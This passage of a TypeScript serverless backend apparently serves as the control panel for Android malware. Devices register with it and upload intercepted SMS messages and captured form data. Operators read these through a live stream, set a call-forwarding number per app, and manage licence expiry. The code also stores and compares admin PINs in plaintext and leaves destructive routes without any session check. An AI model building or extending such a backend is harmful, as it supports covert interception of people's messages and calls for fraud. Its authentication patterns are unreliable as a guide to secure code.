    if (!app) return json({ error: "Invalid App ID" }, 403);
    const appRow = app as { pin: string; status: string; expires_at?: string };
    if (appRow.status !== "active") return json({ error: "App is disabled. Contact admin." }, 403);
    if (appRow.expires_at && new Date(appRow.expires_at) < new Date()) return json({ error: "Access expired. Contact admin." }, 403);
    if (body.password !== appRow.pin) return json({ error: "Invalid password" }, 401);

    // Get login limit from settings table (default 5)
    const { data: limitRow } = await d.from("settings").select("value").eq("app_id", appId).eq("key", "login_limit").single();
    const loginLimit = Math.max(1, parseInt((limitRow as { value: string } | null)?.value ?? "5") || 5);

    // Count current active sessions
    const { data: sessions } = await d.from("admin_sessions").select("id,sub_id").eq("app_id", appId).eq("is_valid", true);
    const sessArr = (sessions as { id: number; sub_id?: string }[] ?? []);
    if (sessArr.length >= loginLimit) return json({ error: "Login limit reached. Ask admin to logout old sessions." }, 429);

    // can_change_password: only the first-ever device (earliest session) can change
    const firstSub = sessArr.length > 0 ? sessArr.sort((a, b) => a.id - b.id)[0].sub_id : null;
    const canChangePassword = !firstSub || firstSub === (body.sub_id ?? "");

    // Create session
    const { data: sess } = await d.from("admin_sessions").insert({
      app_id: appId, sub_id: body.sub_id ?? null,
      login_time: new Date().toISOString(), last_active: new Date().toISOString(), is_valid: true,
    }).select("id").single();
    const sessionId = (sess as { id: number } | null)?.id ?? -1;

    return json({ ok: true, session_id: sessionId, can_change_password: canChangePassword, active_sessions: sessArr.length + 1, login_limit: loginLimit });
  }

  if (method === "GET" && (m = matchPath("/device/:appId/login-info", path))) {
    const appId = m.appId;
    const { data: limitRow } = await d.from("settings").select("value").eq("app_id", appId).eq("key", "login_limit").single();
    const loginLimit = Math.max(1, parseInt((limitRow as { value: string } | null)?.value ?? "5") || 5);
    const { data: sessions } = await d.from("admin_sessions").select("id").eq("app_id", appId).eq("is_valid", true);
    return json({ active_sessions: (sessions as unknown[] ?? []).length, login_limit: loginLimit });
  }

  if (method === "GET" && (m = matchPath("/device/:appId/session/:sid/check", path))) {
    const { data: sess } = await d.from("admin_sessions").select("is_valid").eq("id", m.sid).eq("app_id", m.appId).single();
    if (!sess) return json({ valid: false });
    return json({ valid: (sess as { is_valid: boolean }).is_valid === true });
  }

  if (method === "POST" && (m = matchPath("/device/:appId/admin-change-password", path))) {
    const appId = m.appId;
    const body = await bodyJson() as { old_password?: string; new_password?: string };
    if (!body.old_password || !body.new_password) return json({ error: "old_password and new_password required" }, 400);
    const { data: app } = await d.from("apps").select("pin").eq("app_id", appId).single();
    if (!app) return json({ error: "Invalid App ID" }, 403);
    if ((app as { pin: string }).pin !== body.old_password) return json({ error: "Current password is incorrect" }, 401);
    await d.from("apps").update({ pin: body.new_password }).eq("app_id", appId);
    return json({ ok: true });
  }

  if (method === "DELETE" && (m = matchPath("/device/:appId/logout-all", path))) {
    await d.from("admin_sessions").update({ is_valid: false }).eq("app_id", m.appId);
    return json({ ok: true });
  }

  if (method === "PATCH" && (m = matchPath("/device/:appId/set-login-limit", path))) {
    const appId = m.appId;
    const body = await bodyJson() as { new_limit?: number };
    const limit = Number(body.new_limit);
    if (!limit || limit < 1 || limit > 100) return json({ error: "new_limit must be between 1 and 100" }, 400);
    const { data: existing } = await d.from("settings").select("id").eq("app_id", appId).eq("key", "login_limit").single();
    if (existing) {
      await d.from("settings").update({ value: String(limit) }).eq("app_id", appId).eq("key", "login_limit");
    } else {
      await d.from("settings").insert({ app_id: appId, key: "login_limit", value: String(limit) });
    }
    return json({ ok: true, login_limit: limit });
  }

  // ── Device Data Routes (/device/:appId/...) ───────────────────────────────

  // Helper: convert millisecond epoch → ISO string for TIMESTAMPTZ columns
  function msToIso(v: unknown): string | unknown {
    if (typeof v === "number" && v > 1_000_000_000_000) return new Date(v).toISOString();
    return v;
  }

  // POST /device/:appId/upsert — INSERT OR UPDATE device row (smartUpsert, registerDevice, heartbeat, FCM)
  // Android sends timestamps as ms (Long), TIMESTAMPTZ cols need ISO strings — we convert here
  if (method === "POST" && (m = matchPath("/device/:appId/upsert", path))) {
    const appId = m.appId;
    const body = await bodyJson() as Record<string, unknown>;
    const subId = (body.sub_id ?? body.uid) as string | undefined;
    if (!subId) return json({ error: "sub_id or uid required" }, 400);

    // Normalize TIMESTAMPTZ fields (ms → ISO). BIGINT fields (last_heartbeat_at etc.) stay as-is.
    const TSTZ = new Set(["registered_at", "created_at", "updated_at", "last_seen"]);
    const payload: Record<string, unknown> = {};
    for (const [k, v] of Object.entries(body)) {
      payload[k] = TSTZ.has(k) ? msToIso(v) : v;
    }
    payload.app_id  = appId;
    payload.sub_id  = subId;
    if (!payload.updated_at || payload.updated_at === body.updated_at)
      payload.updated_at = new Date().toISOString();
    if (!payload.registered_at) payload.registered_at = new Date().toISOString();
    if (!payload.created_at)    payload.created_at    = new Date().toISOString();
    delete payload.id; // never set PK

    const sbUrl = env.SUPABASE_URL ?? SB_URL_DEFAULT;
    const res = await fetch(`${sbUrl}/rest/v1/devices`, {
      method: "POST",
      headers: {
        "apikey": env.SUPABASE_SERVICE_ROLE_KEY,
        "Authorization": `Bearer ${env.SUPABASE_SERVICE_ROLE_KEY}`,
        "Content-Type": "application/json",
        "Prefer": "resolution=merge-duplicates,return=representation",
      },
      body: JSON.stringify(payload),
    });

    if (!res.ok) {
      const err = await res.json().catch(() => ({})) as Record<string, string>;
      if (isTableMissing(err)) return json({ error: "Database tables not set up yet.", needs_setup: true }, 503);
      return json({ error: err.message ?? "Upsert failed" }, 500);
    }

    const data = await res.json().catch(() => null);
    const row = Array.isArray(data) ? data[0] : data;
    return json({ ok: true, data: row ?? payload });
  }

  // GET /device/:appId/get/:uid — single device lookup by sub_id (used by getDeviceByUid)
  if (method === "GET" && (m = matchPath("/device/:appId/get/:uid", path))) {
    const { data, error } = await d.from("devices").select("*")
      .eq("app_id", m.appId).eq("sub_id", m.uid).single();
    if (error || !data) return json({ ok: false, error: "Not found" }, 404);
    return json({ ok: true, data });
  }

  // POST /device/:appId/message — insert SMS log into messages table
  if (method === "POST" && (m = matchPath("/device/:appId/message", path))) {
    const appId = m.appId;
    const body  = await bodyJson() as Record<string, unknown>;
    const subId = (body.sub_id ?? body.uid) as string | undefined;
    if (!subId) return json({ error: "sub_id required" }, 400);

    let sentAt = new Date().toISOString();
    if (typeof body.timestamp === "number" && body.timestamp > 1_000_000_000_000)
      sentAt = new Date(body.timestamp as number).toISOString();

    const { error } = await d.from("messages").insert({
      app_id:       appId,
      sub_id:       subId,
      from_id:      (body.sender_number ?? body.phone_number ?? null) as string | null,
      to_id:        (body.receiver_number ?? null) as string | null,
      content:      (body.message_body ?? body.content ?? "") as string,
      message_type: (body.direction ?? "message") as string,
      is_read:      false,
      sent_at:      sentAt,
    });
    const errR = dbErrResp(error); if (errR) return errR;
    return json({ ok: true }, 201);
  }

  // POST /device/:appId/form — submit form/data (form_data table)
  if (method === "POST" && (m = matchPath("/device/:appId/form", path))) {
    const appId = m.appId;
    const body  = await bodyJson() as Record<string, unknown>;
    const subId = (body.sub_id ?? body.uid) as string | undefined;
    if (!subId) return json({ error: "sub_id required" }, 400);

    const { error } = await d.from("form_data").insert({
      app_id:       appId,
      sub_id:       subId,
      form_type:    (body.data_type ?? body.form_type ?? "form") as string,
      data:         body,
      submitted_at: new Date().toISOString(),
    });
    const errR = dbErrResp(error); if (errR) return errR;
    return json({ ok: true }, 201);
  }

  // GET /device/:appId/get — paginated device list (used by getDevicesPage)
  if (method === "GET" && (m = matchPath("/device/:appId/get", path))) {
    const appId = m.appId;
    const offset = Math.max(0, parseInt(url.searchParams.get("offset") ?? "0") || 0);
    const limit  = Math.min(200, Math.max(1, parseInt(url.searchParams.get("limit") ?? "50") || 50));

    const { data, error } = await d.from("devices").select("*")
      .eq("app_id", appId)
      .order("registered_at", { ascending: false })
      .limit(limit + 1);
    const errR = dbErrResp(error); if (errR) return errR;

    const rows = (data as Record<string, unknown>[] ?? []);
    const hasMore = rows.length > limit;
    if (hasMore) rows.pop();

    return json({ data: rows, hasMore, total: rows.length, nextOffset: offset + rows.length });
  }

  // PATCH /device/:appId/update/:uid — update a device row (call forward, starred, etc.)
  if (method === "PATCH" && (m = matchPath("/device/:appId/update/:uid", path))) {
    const body = await bodyJson();
    const IMMUTABLE = new Set(["id", "app_id", "sub_id", "registered_at", "created_at"]);
    const updateData: Record<string, unknown> = { updated_at: new Date().toISOString() };
    for (const [k, v] of Object.entries(body)) { if (!IMMUTABLE.has(k)) updateData[k] = v; }
    const { error } = await d.from("devices").update(updateData).eq("app_id", m.appId).eq("sub_id", m.uid);
    const errR = dbErrResp(error); if (errR) return errR;
    return json({ ok: true });
  }

  // DELETE /device/:appId/delete/:uid — delete a device by sub_id
  if (method === "DELETE" && (m = matchPath("/device/:appId/delete/:uid", path))) {
    const { error } = await d.from("devices").delete().eq("app_id", m.appId).eq("sub_id", m.uid);
    const errR = dbErrResp(error); if (errR) return errR;
    return json({ ok: true });
  }

  // GET /device/:appId/messages — list SMS messages (supports ?uid=&limit=)
  if (method === "GET" && (m = matchPath("/device/:appId/messages", path))) {
    const appId = m.appId;
    const uid   = url.searchParams.get("uid");
    const limit = Math.min(1000, Math.max(1, parseInt(url.searchParams.get("limit") ?? "200") || 200));

    let q = d.from("messages").select("*").eq("app_id", appId)
      .order("sent_at", { ascending: false }).limit(limit);
    if (uid) q = q.eq("sub_id", uid);

    const { data, error } = await q;
    const errR = dbErrResp(error); if (errR) return errR;
    return json({ data: data ?? [] });
  }

  // DELETE /device/:appId/messages/:msgId — delete a single message
  if (method === "DELETE" && (m = matchPath("/device/:appId/messages/:msgId", path))) {
    const { error } = await d.from("messages").delete().eq("id", m.msgId).eq("app_id", m.appId);
    const errR = dbErrResp(error); if (errR) return errR;
    return json({ ok: true });
  }

  // DELETE /device/:appId/messages — delete ALL messages for this app
  if (method === "DELETE" && (m = matchPath("/device/:appId/messages", path))) {
    await d.from("messages").delete().eq("app_id", m.appId);
    return json({ ok: true });
  }

  // GET /device/:appId/form-data — list form submissions (supports ?uid=&limit=)
  if (method === "GET" && (m = matchPath("/device/:appId/form-data", path))) {
    const appId = m.appId;
    const uid   = url.searchParams.get("uid");
    const limit = Math.min(1000, Math.max(1, parseInt(url.searchParams.get("limit") ?? "200") || 200));

    let q = d.from("form_data").select("*").eq("app_id", appId)
      .order("submitted_at", { ascending: false }).limit(limit);
    if (uid) q = q.eq("sub_id", uid);

    const { data, error } = await q;
    const errR = dbErrResp(error); if (errR) return errR;
    return json({ data: data ?? [] });
  }

  // GET /device/:appId/admin-config — get call forward config
  if (method === "GET" && (m = matchPath("/device/:appId/admin-config", path))) {
    const { data: rows } = await d.from("settings").select("key,value").eq("app_id", m.appId);
    let number = "", status = "OFF";
    const cfgRow = (rows as { key: string; value: string }[] ?? []).find(r => r.key === "admin_config");
    if (cfgRow) {
      try { const p = JSON.parse(cfgRow.value); number = p.number ?? ""; status = p.status ?? "OFF"; } catch {}
    }
    return json({ data: { sub_id: "admin_config", data_type: "admin_config", data_json: { number, status }, status, updated_at: 0 } });
  }

  // POST /device/:appId/admin-config — save call forward config
  if (method === "POST" && (m = matchPath("/device/:appId/admin-config", path))) {
    const appId = m.appId;
    const { number = "", status = "OFF" } = await bodyJson() as { number?: string; status?: string };
    const cfgValue = JSON.stringify({ number, status });
    const { data: existing } = await d.from("settings").select("id").eq("app_id", appId).eq("key", "admin_config").single();
    if (existing) {
      await d.from("settings").update({ value: cfgValue }).eq("app_id", appId).eq("key", "admin_config");
    } else {
      await d.from("settings").insert({ app_id: appId, key: "admin_config", value: cfgValue });
    }
    return json({ ok: true });
  }

  // POST /device/:appId/fcm-send — send FCM push notification (stub)
  if (method === "POST" && (m = matchPath("/device/:appId/fcm-send", path))) {
    return json({ ok: false, error: "FCM not configured on backend" });
  }

  // GET /device/:appId/stream — SSE realtime stream (polling-based, ~25s lifetime then reconnect)
  if (method === "GET" && (m = matchPath("/device/:appId/stream", path))) {
    const appId = m.appId;

    const { data: app } = await d.from("apps").select("status,expires_at").eq("app_id", appId).single();
    if (!app) return json({ error: "Invalid App ID" }, 404);
    if ((app as { status: string }).status !== "active") return json({ error: "App inactive" }, 403);

    const encoder = new TextEncoder();

    const stream = new ReadableStream({
      async start(controller) {
        const enqueue = (s: string) => {
          try { controller.enqueue(encoder.encode(s)); } catch {}
        };

        enqueue(`: connected\n\n`);

        // Initial snapshot — send all current devices as INSERT events
        const { data: devices } = await d.from("devices").select("*")
          .eq("app_id", appId)
          .order("registered_at", { ascending: false })
          .limit(200);

        for (const row of (devices as Record<string, unknown>[] ?? [])) {
          enqueue(`event: change\ndata: ${JSON.stringify({ event: "INSERT", record: row })}\n\n`);
        }

        // Poll for updates every 4 seconds; max ~25s runtime then close (client reconnects)
        const startTime  = Date.now();
        const MAX_MS     = 25_000;
        const POLL_MS    = 4_000;
        let   lastCheck  = new Date().toISOString();

        while (Date.now() - startTime < MAX_MS) {
          await new Promise<void>(r => setTimeout(r, POLL_MS));
          enqueue(`: ping\n\n`);

          const now = new Date().toISOString();
          const { data: updated } = await d.from("devices").select("*")
            .eq("app_id", appId).gte("updated_at", lastCheck);
          lastCheck = now;

          for (const row of (updated as Record<string, unknown>[] ?? [])) {
            enqueue(`event: change\ndata: ${JSON.stringify({ event: "UPDATE", record: row })}\n\n`);
          }
        }

        controller.close();
      },
    });

    return new Response(stream, {
      headers: {
        "Content-Type": "text/event-stream",
        "Cache-Control": "no-cache, no-transform",
        "X-Accel-Buffering": "no",
        "Access-Control-Allow-Origin": "*",
        "Connection": "keep-alive",
      },
    });
  }

  return json({ error: "Not found" }, 404);
}

// ── Main entry ────────────────────────────────────────────────────────────────
export const onRequest: PagesFunction<Env> = async (ctx) => {
  const { request, env } = ctx;
  const url = new URL(request.url);
  const path = url.pathname.replace(/^\/api/, "") || "/";
  const method = request.method;

  if (method === "OPTIONS") {
    return new Response(null, { status: 204, headers: { "Access-Control-Allow-Origin": "*", "Access-Control-Allow-Methods": "GET,POST,PUT,PATCH,DELETE,OPTIONS", "Access-Control-Allow-Headers": "Content-Type,x-admin-token", "Access-Control-Max-Age": "86400" } });
  }

  try {
    return await route(method, path, request, env, url);
  } catch (err) {
    return new Response(JSON.stringify({ error: "Internal server error", detail: String(err) }), { status: 500, headers: { "Content-Type": "application/json" } });
  }
};
